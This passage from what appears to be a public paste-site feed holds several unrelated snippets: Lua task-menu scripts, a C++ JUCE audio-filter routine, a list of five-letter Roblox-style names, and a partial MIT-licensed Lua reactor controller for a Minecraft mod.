                monitor.write(""Please enter a valid number."")
            end
        elseif message == ""3"" then
            displayTasks()
        elseif message == ""4"" then
            running = false
        else
            monitor.setCursorPos(1,6)
            monitor.setTextColor(colors.red)
            monitor.write(""Invalid choice."")
            monitor.setTextColor(colors.white)
        end
        sleep(2)
    end
end

-- Initialize the program
authenticate()
"
jZ1Gisfu,Untitled,olivercromwell,C++,Sunday 28th of May 2023 04:42:20 PM CDT,"#include <deque>
#include <array>

Filter filter_left;
Filter filter_right;

std::deque<float> output_buffer_left;
std::deque<float> output_buffer_right;
std::deque<float> buffer_left;
std::deque<float> buffer_right;
std::array<float, 8192> arr_left = {};
std::array<float, 8192> arr_right = {};
void SSBCleanupProcessorAudioProcessor::processBlock(juce::AudioBuffer<float>& buffer, juce::MidiBuffer& midiMessages) {
	

	juce::ScopedNoDenormals noDenormals;
	auto totalNumInputChannels = getTotalNumInputChannels();
	auto totalNumOutputChannels = getTotalNumOutputChannels();
	auto numSamples = buffer.getNumSamples();

	filter_left.setConstant(entropyValue);
	filter_left.set_NBINS(binsValue);
	filter_right.setConstant(entropyValue);
	filter_right.set_NBINS(binsValue);
	arr_left.fill({ 0.0f });
	arr_right.fill({ 0.0f });


		auto* channelData_left = buffer.getWritePointer(0);
		auto* channelData_right = buffer.getWritePointer(1);

		for (int i = 0; i < numSamples; ++i) {
			buffer_left.push_back(channelData_left[i]);
		}

		for (int i = 0; i < numSamples; ++i) {
			buffer_right.push_back(channelData_right[i]);
		}

		while (buffer_left.size() >= 8192) {
			for (auto& v : arr_left) {
				v = buffer_left.front();
				buffer_left.pop_front();
			}
			arr_left = filter_left.process(arr_left); // Process arr.
			for (const auto& sample : arr_left) {
				output_buffer_left.push_back(sample);
			}
			// Continue processing and pushing to output_buffer_left...
		}

		while (buffer_right.size() >= 8192) {
			for (auto& v : arr_right) {
				v = buffer_right.front();
				buffer_right.pop_front();
			}
			arr_right = filter_right.process(arr_right);
			for (const auto& sample : arr_right) {
				output_buffer_right.push_back(sample);
			}
			// Continue processing and pushing to output_buffer_right...
		}


	for (auto i = totalNumInputChannels; i < totalNumInputChannels; i++) {
		buffer.clear(i, 0, buffer.getNumSamples());
	}

	for (int i = 0; i < numSamples; ++i) {
		if (!output_buffer_left.empty()) {
			channelData_left[i] = output_buffer_left.front();
			output_buffer_left.pop_front();
		}
		else {
			channelData_left[i] = 0.0f; // Or any appropriate default value.
		}
	}

	for (int i = 0; i < numSamples; ++i) {
		if (!output_buffer_right.empty()) {
			channelData_right[i] = output_buffer_right.front();
			output_buffer_right.pop_front();
		}
		else {
			channelData_right[i] = 0.0f; // Or any appropriate default value.
		}
	}
	
}"
d1XNMx4d,(557) EVERY Roblox 5 Letter Starting With 'C',0b,Python,Sunday 28th of May 2023 04:26:47 PM CDT,"cbgoc
cbgzh
cbixq
cbjpe
cbkbg
cbkca
cbknw
cbkva
cbkvq
cbkvs
cbkxa
cblnu
cbmdw
cbpbr
cbqcu
cbrlu
cbtjq
cbtpf
cbuvq
cbvem
cbwap
cbwau
cbwep
cbwpm
cbwpu
cbwpv
cbwpy
cbwum
cbwuv
cbwyq
cbwyz
cbyiz
cbzli
ccgwc
ccpuy
ccqfr
ccqvh
ccszy
ccwzj
ccxmw
ccytq
cdblf
cdbmq
cdbnl
cdbvi
cdbzp
cdfjq
cdgqa
cdgqc
cdgqm
cdgqy
cdiyl
cdjnl
cdknp
cdlqc
cdlqf
cdlqo
cdlqv
cdlwi
cdlwj
cdlwm
cdmgl
cdmjb
cdmjq
cdmku
cdmwz
cdmzn
cdmzu
cdnuo
cdnwd
cdnyq
cdpfu
cdplz
cdqej
cdqut
cdrcq
cduki
cdukl
cdwjm
cdzct
ceclb
cecvd
cecvj
cecvk
cefwm
cejqp
celnh
ceqhw
cexwd
cexwt
cezgb
cezmd
cfbcp
cfiqn
cfkfz
cfowm
cfqcz
cfqlb
cfqln
cfqpa
cftiz
cfuvp
cfwmt
cfxod
cgapc
cgilz
cgimq
cgimy
cgkwe
cglwt
cglxt
cgmfz
cgnxl
cgqkn
cgrqn
cgzcu
cgzjq
chwyj
cimbg
cimxj
ciqrp
ciqtg
ciqtj
ciqyb
ciqyp
ciqyu
cixkm
cizbq
cizbw
cizmh
ciznj
cjblf
cjecv
cjemh
cjevp
cjexq
cjezd
cjezf
cjezn
cjezq
cjrqy
cjtfq
cjtnl
cjtpx
cjwdq
cjwfm
cjwpv
cjziy
ckbdz
ckbzs
ckgtn
ckhkt
ckhln
ckhvq
ckhzz
ckitb
ckiyv
cklkq
ckmlq
ckmtd
cknpz
ckqxt
ckugx
ckusq
ckwzs
ckzkq
ckzwk
ckzzw
clbez
clbmz
clbqe
clbqj
clbqn
clbqr
clbqz
clbrw
clbwa
clbwc
clbwg
clbwj
clbwm
clbwo
clbws
clbwu
clbyd
clfhg
clfkw
clfxy
clmdi
clmdt
clmdw
clmiw
clmoj
clmuc
clqkt
clvpw
clwml
cmbyq
cmcsq
cmfxt
cmkvz
cmkyd
cmnca
cmpfb
cmqgm
cmqmh
cmtoh
cmvlj
cmwgr
cmwgz
cmytw
cndwd
cnfaw
cnfaz
cnfpq
cnhcl
cnhma
cnjeq
cnjqa
cnjqb
cnjqc
cnjqd
cnjqh
cnjql
cnjqv
cnjqx
cnjwt
cnnqj
cnpdu
cnrbq
cnrmp
cnrmq
cnrqm
cnrvw
cnswv
cntqh
cnwbf
cnwcq
cnwln
cnyvq
cnyyq
coeqg
cogqt
cohqv
cpafu
cpbgy
cpbiq
cpbis
cpbiu
cpbiv
cpboe
cpbor
cpbov
cpboz
cpbpi
cpbpj
cpbpm
cpbpq
cpbps
cpbpx
cpbpy
cpbrg
cpbrn
cpbrz
cpbtd
cpbtf
cpbtl
cpbtm
cpbtp
cpbtx
cpbua
cpbub
cpbul
cpbuu
cpbuz
cpbxs
cpbyb
cpbye
cpbyg
cpbyj
cpbyk
cpbyo
cpbyq
cpbyt
cpbyx
cpbyy
cpccj
cpcjg
cpcxk
cpeph
cpfik
cpfrz
cpgaw
cpgki
cphhw
cpiql
cpjaq
cpjoj
cpjqm
cpknz
cplcv
cpmnc
cpnsi
cpnyd
cpocv
cppvd
cpqcz
cpqjz
cpqku
cpqth
cpqvo
cpsnx
cpswq
cpuob
cpvlk
cpvwg
cpwro
cpwth
cpxms
cpyim
cpylq
cpymf
cpymu
cpywh
cpyxh
cpznu
cpzsg
cqbhw
cqbjv
cqbkt
cqbnd
cqbwc
cqdbz
cqdyf
cqejn
cqenb
cqfoz
cqgby
cqgho
cqgtu
cqgyw
cqhll
cqhmj
cqhxw
cqhzq
cqife
cqjrv
cqjwf
cqjzs
cqkrj
cqkzm
cqlcr
cqlhs
cqlnc
cqlpf
cqlpp
cqlrm
cqlty
cqluf
cqluj
cqluk
cqlxf
cqlyk
cqmwx
cqnqv
cqodx
cqpgo
cqqdr
cqrwp
cqspk
cqsqm
cqsqo
cqsqv
cqsrc
cqsrh
cqsri
cqsrm
cqstf
cqstp
cqsud
cqsuj
cqswb
cqswj
cqswr
cqswv
cqswx
cqsyk
cqsyp
cqtem
cquxg
cqvew
cqvlb
cqxbw
cqxgc
cqyfy
cqyxs
cqztd
crbwb
crkfu
crkgm
crmcv
crmfh
crqjn
crqsc
crwvb
crzgq
csbgt
csecz
csfvp
csgwl
csmyn
csnln
csqec
csqlu
csspt
csuzc
cswmf
cszlt
ctbwu
ctbwz
ctgrn
ctipj
ctkcq
ctmqg
ctmqi
ctmqj
ctmqz
ctmvw
ctnkx
ctnvw
ctnzb
ctnzm
ctpxt
ctuav
ctvwt
ctwcd
ctziq
cucpf
cugmq
cuqxb
curqc
cuxjq
cuxqc
cuxqf
cuxqg
cuxqh
cuxqj
cuxwc
cuxwh
cuxwt
cuzwf
cvbqh
cvclj
cvdyb
cvdzu
cvgqz
cvhcq
cvlcb
cvlha
cvlnp
cvlwg
cvmuv
cvowc
cvpql
cvpsq
cvtrm
cvwyh
cvykd
cvywt
cwafq
cwaow
cwapd
cwavq
cwbbq
cwclb
cwdjm
cwdqg
cwdzp
cwffk
cwfpg
cwgwk
cwgyn
cwhwp
cwjab
cwjir
cwjiu
cwjoc
cwjow
cwjpn
cwjum
cwjup
cwjuz
cwjyb
cwkgh
cwkjn
cwkjv
cwlhf
cwmqn
cwnfp
cwnhz
cwnpx
cwvqz
cwzox
cxjcq
cxjmj
cxmdq
cxmfo
cxmgl
cxucr
cxwzb
cxxwb
cyedq
cyepz
cyglm
cyjph
cyqbj
cyqbn
cyqbt
cyqcf
cyqch
cyqcl
cyqcs
cyqdl
cyqmx
cywqo
cywqp
cyyhz
cyyjz
cyykq
cyylr
cyyzb
cyzmq
czbzp
czdcq
czdnu
czicm
czljq
czlzi
czmfc
cznhi
czofv
czoxf
czpdn
czpfq
czphx
czpjf
czqim
czqpu
czqzj
czsqj
czsyv
cztfm
cztmb
cztuv
czugn
czvqh
czwpw"
AEkKkYNa,board.lua,FoxPit,Lua,Sunday 28th of May 2023 04:07:05 PM CDT,"local color = {
  Reset = ""\27[0m"",
  Red = ""\27[31m"",
  Green = ""\27[32m"",
  Yellow = ""\27[33m"",
  Blue = ""\27[34m"",
  Magenta = ""\27[35m"",
  Cyan = ""\27[36m"",
  White = ""\27[37m""
}

-- Create an empty table to store tasks
local buildBoard = {}

-- Function to add a new task to the build board
local function addTask(task)
  table.insert(buildBoard, task)
  print(color.Green .. ""Task added: "" .. task .. color.Reset)
end

-- Function to remove a task from the build board
local function removeTask(index)
  if buildBoard[index] then
    local removedTask = table.remove(buildBoard, index)
    print(color.Red .. ""Task removed: "" .. removedTask .. color.Reset)
  else
    print(color.Red .. ""Invalid task index."" .. color.Reset)
  end
end

-- Function to display all tasks on the build board
local function displayTasks()
  print(color.Cyan .. ""Build Board Tasks:"" .. color.Reset)
  for index, task in ipairs(buildBoard) do
    print(color.White .. index .. "". "" .. task .. color.Reset)
  end
end

-- Main program loop
local running = true
while running do
  print(color.Yellow .. ""===== Build Board Program ====="" .. color.Reset)
  print(""1. Add task"")
  print(""2. Remove task"")
  print(""3. Display tasks"")
  print(""4. Exit"")

  local choice = tonumber(io.read(""*n"")) -- Read user input as a number

  if choice == 1 then
    print(""Enter task:"")
    local task = io.read()
    addTask(task)
  elseif choice == 2 then
    print(""Enter task index:"")
    local index = tonumber(io.read(""*n""))
    removeTask(index)
  elseif choice == 3 then
    displayTasks()
  elseif choice == 4 then
    running = false
  else
    print(color.Red .. ""Invalid choice."" .. color.Reset)
  end

  print() -- Print an empty line for better readability
end
"
Ft9EVuXe,Untitled,Samsterminator,Lua,Sunday 28th of May 2023 03:56:21 PM CDT,"local tag = ""reactorConfig""
version = ""0.43""
--[[
Program made by DrunkenKas
	See github: https://github.com/Kasra-G/ReactorController/#readme

The MIT License (MIT)
 
Copyright (c) 2021 Kasra Ghaffari
 
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
 
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
 
THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
]]
local reactorType
local mon, monSide, reactorSide
local sizex, sizey, dim, oo, offy
local btnOn, btnOff, invalidDim
local minb, maxb, minrod
local rod, rfLost
local storedLastTick, storedThisTick, lastRFT, maxRFT = 0,0,0,1
local fuelTemp, caseTemp, fuelUsage, waste, capacity = 0,0,0,0,0
local t
local displayingGraphMenu = false
local calibrated = false

--table of which graphs to draw
local graphsToDraw = {}

--table of all the graphs
local graphs = 
{
    ""Energy Buffer"",
    ""Control Level"",
    ""Temperatures"",
}

--marks the offsets for each graph position
local XOffs = 
{
    {4, true}, 
    {27, true}, 
    {50, true}, 
    {73, true}, 
    {96, true},
}

--Draw a single point
local function drawPoint(x, y, color)
    if (monSide ~= nil) then
        local ix,iy = mon.getCursorPos()
        mon.setCursorPos(x,y)
        mon.setBackgroundColor(color)
        mon.write("" "")
        mon.setBackgroundColor(colors.black)
        mon.setCursorPos(ix,iy)
    end
end

--Draw a box with no fill
local function drawBox(size, xoff, yoff, color)
    if (monSide ~= nil) then
        local x,y = mon.getCursorPos()
        mon.setBackgroundColor(color)
        for i=0,size[1] - 1 do
            mon.setCursorPos(xoff + i + 1, yoff + 1)
            mon.write("" "")
            mon.setCursorPos(xoff + i + 1, yoff + size[2])
            mon.write("" "")
        end
        for i=0, size[2] - 1 do
            mon.setCursorPos(xoff + 1, yoff + i + 1)
            mon.write("" "")
            mon.setCursorPos(xoff + size[1], yoff + i +1)
            mon.write("" "")
        end
        mon.setCursorPos(x,y)
        mon.setBackgroundColor(colors.black)
    end
end

--Draw a filled box
local function drawFilledBox(size, xoff, yoff, colorOut, colorIn)
    if (monSide ~= nil) then
        local horizLine = """"
        for i=2, size[1] - 1 do
            horizLine  = horizLine.."" ""
        end
        drawBox(size, xoff, yoff, colorOut)
        local x,y = mon.getCursorPos()
        mon.setBackgroundColor(colorIn)
        for i=2, size[2] - 1 do
            mon.setCursorPos(xoff + 2, yoff + i)
            mon.write(horizLine)
        end
        mon.setBackgroundColor(colors.black)
        mon.setCursorPos(x,y)
    end
end

--Draws text on the screen
local function drawText(text, x1, y1, backColor, textColor)
    if (monSide ~= nil) then
        local x, y = mon.getCursorPos()
        mon.setCursorPos(x1, y1)
        mon.setBackgroundColor(backColor)
        mon.setTextColor(textColor)
        mon.write(text)
        mon.setTextColor(colors.white)
        mon.setBackgroundColor(colors.black)
        mon.setCursorPos(x,y)
    end
end

--Helper method for adding buttons
local function addButt(name, callBack, size, xoff, yoff, color1, color2)
    if (monSide ~= nil) then
        t:add(name, callBack, 
            xoff + 1, yoff + 1, 
            size[1] + xoff, size[2] + yoff, 
            color1, color2)	
    end
end

--adds buttons
local function addButtons()
    if (sizey == 24) then
        oo = 1
    end
    addButt(""On"", nil, {8, 3}, dim + 7, 3 + oo,
        colors.red, colors.lime)
    addButt(""Off"", nil, {8, 3}, dim + 19, 3 + oo,
        colors.red, colors.lime)
    if (btnOn) then
        t:toggleButton(""On"")
    else
        t:toggleButton(""Off"")
    end
    if (sizey > 24) then
        addButt(""+ 10"", nil, {8, 3}, dim + 7, 14 + oo,
            colors.purple, colors.pink)
        addButt("" + 10 "", nil, {8, 3}, dim + 19, 14 + oo,
            colors.magenta, colors.pink)
        addButt(""- 10"", nil, {8, 3}, dim + 7, 18 + oo,
            colors.purple, colors.pink)
        addButt("" - 10 "", nil, {8, 3}, dim + 19, 18 + oo,
            colors.magenta, colors.pink)
    end
end

--Resets the monitor
local function resetMon()
    if (monSide ~= nil) then
        mon.setBackgroundColor(colors.black)
        mon.clear()
        mon.setTextScale(0.5)
        mon.setCursorPos(1,1)
    end
end

local function getPercPower()
    return storedThisTick / capacity * 100
end

local function rnd(num, dig)
    return math.floor(10 ^ dig * num) / (10 ^ dig)
end

local function getEfficiency()
    return lastRFT / fuelUsage
end

local function getGenRatio()
    return lastRFT / capacity
end

local function format(num)
    if (num >= 1000000000) then
        return string.format(""%7.3f G"", num / 1000000000)
    elseif (num >= 1000000) then
        return string.format(""%7.3f M"", num / 1000000)
    elseif (num >= 1000) then
        return string.format(""%7.3f K"", num / 1000)
    elseif (num >= 1) then
        return string.format(""%7.3f "", num)
    elseif (num >= .001) then
        return string.format(""%7.3f m"", num * 1000)
    elseif (num >= .000001) then
        return string.format(""%7.3f u"", num * 1000000)
    else
        return string.format(""%7.3f "", 0)
    end
end

local function getAvailableXOff()
    for i,v in pairs(XOffs) do
        if (v[2] and v[1] < dim) then
            v[2] = false
            return v[1]
        end
    end
    return -1
end

local function getXOff(num)
    for i,v in pairs(XOffs) do
        if (v[1] == num) then
            return v
        end
    end
    return nil
end

local function disableGraph(name)
    if (graphsToDraw[name] ~= nil) then
        if (displayingGraphMenu) then
            t:toggleButton(name)
        end
        getXOff(graphsToDraw[name])[2] = true
        graphsToDraw[name] = nil
    end
end

local function addGraphButtons()
    offy = oo - 14
    for i,v in pairs(graphs) do
        addButt(v, nil, {20, 3},
            dim + 7, offy + i * 3 - 1,
            colors.red, colors.lime)
        if (graphsToDraw[v] ~= nil) then
            t:toggleButton(v)
        end
    end
end

local function drawGraphButtons()
    drawBox({sizex - dim - 3, oo - offy - 1}, 
        dim + 2, offy, colors.orange)
    drawText("" Graph Controls "",
        dim + 7, offy + 1,
        colors.black, colors.orange)
end

local function isGraph(name)
    for i,v in pairs(graphs) do
        if (v == name) then
            return true
        end
    end
    return false
end

local function getGraph(num)
    for i,v in pairs(graphsToDraw) do
        if (v == num) then
            return i
        end
    end
    return nil
end

local function enableGraph(name)
    if (graphsToDraw[name] == nil) then
        local e = getAvailableXOff()
        if (e ~= -1) then
            graphsToDraw[name] = e
            if (displayingGraphMenu) then
                t:toggleButton(name)
            end
        end
    end
end

local function toggleGraph(name)
    if (graphsToDraw[name] == nil) then
        enableGraph(name)
    else
        disableGraph(name)
    end
end

local function drawEnergyBuffer(xoff)
    local srf = sizey - 9
    local off = xoff
    local right = off + 19 < dim
    local poff = right and off + 15 or off - 6

    drawBox({15, srf + 2}, off - 1, 4, colors.gray)
    local pwr = math.floor(getPercPower() / 100 
        * (srf))
    drawFilledBox({13, srf}, off, 5,
        colors.red, colors.red)
    local rndpw = rnd(getPercPower(), 2)
    local color = (rndpw < maxb and rndpw > minb) and colors.green
    or (rndpw >= maxb and colors.orange or colors.blue)
    if (pwr > 0) then
        drawFilledBox({13, pwr + 1}, off, srf + 4 - pwr,
            color, color)
    end
    --drawPoint(off + 14, srf + 5 - pwr, pwr > 0 and color or colors.red)
    drawText(string.format(right and ""%.2f%%"" or ""%5.2f%%"", rndpw), poff, srf + 5 - pwr,
        colors.black, color)
    drawText(""Stored Energy"", off + 1, 4,
        colors.black, colors.orange)
    drawText(format(storedThisTick)..""RF"", off + 1, srf + 5 - pwr,
        pwr > 0 and color or colors.red, colors.black)
end

local function drawControlLevel(xoff)
    local srf = sizey - 9
    local off = xoff
    drawBox({15, srf + 2}, off - 1, 4, colors.gray)
    drawFilledBox({13, srf}, off, 5,
        colors.red, colors.red)
    local rodTr = math.floor(rod / 100 
        * (srf))
    drawText(""Control Level"", off + 1, 4,
        colors.black, colors.orange)
    if (rodTr > 0) then
        drawFilledBox({9, rodTr}, off + 2, 5,
            colors.orange, colors.orange)
    end
    drawText(string.format(""%6.2f%%"", rod), off + 4, rodTr > 0 and rodTr + 5 or 6,
        rodTr > 0 and colors.orange or colors.red, colors.black)

end

local function drawTemperatures(xoff)
    local srf = sizey - 9
    local off = xoff
    drawBox({15, srf + 2}, off, 4, colors.gray)
    --drawFilledBox({12, srf}, off, 5,
    --	colors.red, colors.red)

    --[[
        storedThisTick = reactor.getLastInput()
        lastRFT = reactor.getLastInput()
    ]]

    local fuelRnd = math.floor(lastRFT)
    local caseRnd = math.floor(storedThisTick)
    local fuelTr = math.floor(fuelRnd * (srf))
    local caseTr = math.floor(caseRnd / (maxThru/1000)
        * (srf))
    drawText("" Case "", off + 2, 5,
        colors.gray, colors.lightBlue)
    drawText("" Fuel "", off + 9, 5,
        colors.gray, colors.magenta)
    if (fuelTr > 0) then
        fuelTr = math.min(fuelTr, srf)
        drawFilledBox({6, fuelTr}, off + 8, srf + 5 - fuelTr,
            colors.magenta, colors.magenta)

        drawText(string.format(""%4sC"", format(fuelRnd)..""""), 
            off + 10, srf + 6 - fuelTr,
            colors.magenta, colors.black)
    else
        drawText(string.format(""%4sC"", format(fuelRnd)..""""), 
            off + 10, srf + 5,
            colors.black, colors.magenta)
    end

    if (caseTr > 0) then
        caseTr = math.min(caseTr, srf)
        drawFilledBox({6, caseTr}, off + 1, srf + 5 - caseTr,
            colors.lightBlue, colors.lightBlue)
        drawText(string.format(""%4sC"", caseRnd..""""), 
            off + 3, srf + 6 - caseTr,
            colors.lightBlue, colors.black)
    else
        drawText(string.format(""%4sC"", caseRnd..""""), 
            off + 3, srf + 5,
            colors.black, colors.lightBlue)
    end

    drawText(""Temperatures"", off + 2, 4,
        colors.black, colors.orange)
    drawBox({1, srf}, off + 7, 5,
        colors.gray)
end

local beg
local function drawGraph(name, offset)
    if (name == ""Energy Buffer"") then
        drawEnergyBuffer(offset)
    elseif (name == ""Control Level"") then
        drawControlLevel(offset)
    elseif (name == ""Temperatures"") then
        drawTemperatures(offset)
    end
end

local function drawGraphs()
    for i,v in pairs(graphsToDraw) do
        if (v + 15 < dim) then
            drawGraph(i,v)
        end
    end
end

local function drawStatus()
    if (dim > -1) then
        drawBox({dim, sizey - 2},
            1, 1, colors.lightBlue)
        drawText("" Reactor Graphs "", dim - 18, 2, 
            colors.black, colors.lightBlue)
        drawGraphs()
    end
end

local function drawControls()
    if (sizey == 24) then
        drawBox({sizex - dim - 3, 9}, dim + 2, oo, 
            colors.cyan)
        drawText("" Reactor Controls "", dim + 7, oo + 1, 
            colors.black, colors.cyan)
        drawText(""Reactor ""..(btnOn and ""Online"" or ""Offline""), 
            dim + 10, 3 + oo,
            colors.black, btnOn and colors.green or colors.red)
    else
        drawBox({sizex - dim - 3, 23}, dim + 2, oo, 
            colors.cyan)
        drawText("" Reactor Controls "", dim + 7, oo + 1, 
            colors.black, colors.cyan)
        drawFilledBox({20, 3}, dim + 7, 8 + oo,
            colors.red, colors.red)
        drawFilledBox({(maxb - minb) / 5, 3}, 
            dim + 7 + minb / 5, 8 + oo, 
            colors.green, colors.green)
        drawText(string.format(""%3s"", minb..""%""), dim + 6 + minb / 5, 12 + oo,
            colors.black, colors.purple)
        drawText(maxb..""%"", dim + 8 + maxb / 5, 12 + oo,
            colors.black, colors.magenta)
        drawText(""Buffer Target Range"", dim + 8, 8 + oo,
            colors.black, colors.orange)
        drawText(""Min"", dim + 10, 14 + oo,
            colors.black, colors.purple)
        drawText(""Max"", dim + 22, 14 + oo,
            colors.black, colors.magenta)
        drawText(""Reactor "".. (btnOn and ""Online"" or ""Offline""), 
            dim + 10, 3 + oo,
            colors.black, btnOn and colors.green or colors.red)
    end
end

local function drawStatistics()
    local oS = sizey - 13
    drawBox({sizex - dim - 3, sizey - oS - 1}, dim + 2, oS,
        colors.blue)
    drawText("" Reactor Statistics "", dim + 7, oS + 1,
        colors.black, colors.blue)

    --statistics
    drawText(""Generating : ""
        ..format(lastRFT)..""RF/t"", dim + 5, oS + 3,
        colors.black, colors.green)
    drawText(""RF Drain   ""
        ..(storedThisTick <= lastRFT and ""> "" or "": "")
        ..format(rfLost)
        ..""RF/t"", dim + 5, oS + 5,
        colors.black, colors.red)
    drawText(""Efficiency : ""
        ..format(getEfficiency())..""RF/B"", 
        dim + 5, oS + 7,
        colors.black, colors.green)
    drawText(""Fuel Usage : ""
        ..format(fuelUsage)
        ..""B/t"", dim + 5, oS + 9,
        colors.black, colors.green)
    drawText(""Waste      : ""
        ..string.format(""%7d mB"", waste),
        dim + 5, oS + 11,
        colors.black, colors.green)
end

--Draw a scene
local function drawScene()
    if (monSide ~= nil) then
        t:draw()
    end
    if (displayingGraphMenu) then
        drawGraphButtons()
    end
    if (invalidDim) then
        if (monSide ~= nil) then
            mon.write(""Invalid Monitor Dimensions"")
        end
    else
        drawControls()
        drawStatus()
        drawStatistics()
    end
end

--Redraws all the buttons
--Updates the important values
local function reDrawButtons()
    if (monSide ~= nil) then
        t = touchpoint.new(monSide)
        sizex, sizey = mon.getSize()
        oo = sizey - 37
        dim = sizex - 33
    end
    --print(sizex, sizey)
    if (sizex == 36) then
        dim = -1
    end
    if (pcall(addGraphButtons)) then
        drawGraphButtons()
        displayingGraphMenu = true
    else
        if (monSide ~= nil) then
            t = touchpoint.new(monSide)
        end
        displayingGraphMenu = false
    end
    local rtn = pcall(addButtons)
    if (not rtn) then
        if (monSide ~= nil) then
            t = touchpoint.new(monSide)
        end
        invalidDim = true
    else
        invalidDim = false
    end
    --t:draw()
end

local function setRods(level)
    level = math.max(level, 0)
    level = math.min(level, 100)
    --reactor.setAllControlRodLevels(level)
end

--Turns off the reactor
local function turnOff()
    if (btnOn) then
        t:toggleButton(""Off"")
        t:toggleButton(""On"")
        btnOff = true
        btnOn = false
        setRods(100)
        --reactor.setActive(false)
    end
end

--Turns on the reactor
local function turnOn()
    if (btnOff) then
        t:toggleButton(""Off"")
        t:toggleButton(""On"")
        btnOff = false
        btnOn = true
        --reactor.setActive(true)
    end
end

--adjusts the level of the rods
local function adjustRods()
    local currentRF = storedThisTick
    local diffb = maxb - minb
    maxRF = maxb / 100 * capacity
    minRF = minb / 100 * capacity
    diffRF = diffb / 100 * capacity
    local diffr = diffb / 100
    local targetRFT = rfLost
    local currentRFT = lastRFT
    local diffRFT = currentRFT/targetRFT
    local targetRF = diffRF / 2 + minRF

    currentRF = math.min(currentRF, maxRF)
    local equation1 = math.min((currentRF - minRF)/diffRF, 1)
    equation1 = math.max(equation1, 0)
    
	local rodLevel = rod
    if (storedThisTick < minRF) then
        rodLevel = 0
    elseif ((storedThisTick < maxRF and storedThisTick > minRF)) then
        equation1 = equation1 * (currentRF / targetRF) --^ 2
        equation1 = equation1 * diffRFT --^ 5
        equation1 = equation1 * 100

        rodLevel = equation1
    elseif (storedThisTick > maxRF) then
        rodLevel = 100
    end
    setRods(rodLevel)
end

--Saves the configuration of the reactor controller
local function saveChanges()
    local file = fs.open(tag.."".txt"", ""w"")
    file.writeLine(calibrated)
    if (calibrated) then
        file.writeLine(capacity)
        file.writeLine(maxRFT)
    end
    file.writeLine(maxb)
    file.writeLine(minb)
    file.writeLine(rod)
    file.writeLine(btnOn)
    for i,v in pairs(XOffs) do
        local graph = getGraph(v[1])
        graph = (graph == nil and ""nil"" or graph)
        file.writeLine(graph)
        file.writeLine(v[1])
    end
    file.close()
end

--returns the side that a given peripheral type is connected to
local function getPeripheral(name)
    for i,v in pairs(peripheral.getNames()) do
        if (peripheral.getType(v) == name) then
            return v
        end
    end
    return """"
end

local function updateStats()
    storedLastTick = storedThisTick

    storedThisTick = reactor.getLastInput()
    lastRFT = reactor.getLastInput()
    capacity = reactor.getMaxEnergy()
    maxThru = reactor.getTransferCap()
    rod = 0
    fuelUsage = 0
    waste = 0
    fuelTemp = 0
    caseTemp = 0
    rfLost = reactor.getLastOutput()
end

--Updates statistics and adjusts the rods
local function compute()
    updateStats()
    if (btnOn) then
        adjustRods()
    end
end

--The main routine that runs each tick
function routine()
    while (true) do
        --[[
        If the graphs are drawn every tick, everything
        just breaks.
        If the graphs are drawn every 2nd tick, my
        RFLost calculation is wrong every time
        If the graphs are drawn every 3rd tick, my
        RFLost calculation is wrong sometimes

        THIS MAKES NO SENSE
        ]]
        for i = 1,4 do	
            compute()
            sleep(0.01)
        end
        resetMon()
        drawScene()
    end
end

--Manages window resizing events
function resizer()
    while (true) do
        local event = os.pullEvent(""monitor_resize"")
        if (event == ""monitor_resize"") then
            reDrawButtons()
        end
    end
end

local function calibrate()
    setRods(0)
    --reactor.setActive(true)
    sleep(15)
    updateStats()
    setRods(100)
    --reactor.setActive(false)
    maxRFT = lastRFT
end

--Initialize variables from either a config file or the defaults
local function initializeVars()
    invalidDim = false
    if (not fs.exists(tag.."".txt"")) then
        print(""Config file ""..tag.."" not found, generating a default one!"")
        repeat
            print(""The program can be optionally calibrated. Proceed? (y/n) "")
            local response = read()
            if (response == ""n"") then
                print(""Calibration skipped. Some functions may be unavailable"")
                calbrated = false
            elseif (response == ""y"") then
                print(""Beginning 15 second calibration, do not turn off the reactor!"")
                calibrate()
                print(""Calibrated!"")
                calibrated = true
            end
        until response == ""y"" or response == ""n""
        
        maxb = 70
        minb = 30
        rod = 80
        btnOn = false
        if (monSide == nil) then
            btnOn = true
        end
        dim = sizex - 33
        oo = sizey - 37
        enableGraph(""Energy Buffer"")
        enableGraph(""Control Level"")
        enableGraph(""Temperatures"")
    else
        local file = fs.open(tag.."".txt"", ""r"")
        print(""Config file ""..tag.."" found! Using configurated settings"")

        calibrated = file.readLine() == ""true""
        
        --read calibration information
        if (calibrated) then
        	capacity = tonumber(file.readLine())
        	maxRFT = tonumber(file.readLine())
        end
        maxb = tonumber(file.readLine())
        minb = tonumber(file.readLine())
        rod = tonumber(file.readLine())
        btnOn = file.readLine() == ""true""

        --read Graph data
        for i in pairs(XOffs) do
            local graph = file.readLine()
            local v1 = tonumber(file.readLine())
            local v2 = true
            if (graph ~= ""nil"") then
                v2 = false
                graphsToDraw[graph] = v1
            end

            XOffs[i] = {v1, v2}

        end
        file.close()
    end
    btnOff = not btnOn
    diffb = maxb - minb
    --reactor.setActive(btnOn)
end

--Initialize program
local function initialize()
    term.setBackgroundColor(colors.black)
    term.clear()
    term.setCursorPos(1,1)
    os.loadAPI(""/usr/apis/touchpoint.lua"")
    reactorSide = getPeripheral(""inductionPort"")
    reactorVersion = ""Bigger Reactors""
    reactor = peripheral.wrap(reactorSide)
    if (reactor == nil) then
        reactorSide = getPeripheral(""bigger-reactor"")
        reactor = peripheral.wrap(reactorSide)
		reactorVersion = ""Big Reactors""
    end
    monSide = getPeripheral(""monitor"")
    monSide = monSide == """" and nil or monSide
    sizex, sizey = 36, 38
    if (monSide ~= nil) then
